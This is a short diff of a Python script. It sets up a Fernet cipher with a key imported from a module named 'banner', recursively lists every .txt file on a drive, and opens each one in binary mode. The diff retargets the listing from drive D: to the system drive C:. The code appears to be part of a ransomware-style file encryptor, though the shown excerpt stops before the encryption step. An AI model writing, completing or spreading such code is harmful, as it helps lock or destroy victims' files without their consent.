@@ -6,7 +6,7 @@ import banner
 enc = Fernet(banner.key2)
   
 try:
-    cmd = check_output("D: && dir /S /B *.txt",shell=True).decode().split()
+    cmd = check_output("C: && dir /S /B *.txt",shell=True).decode().split()
 
     for g in cmd:
         dirlist = open(g,"rb")
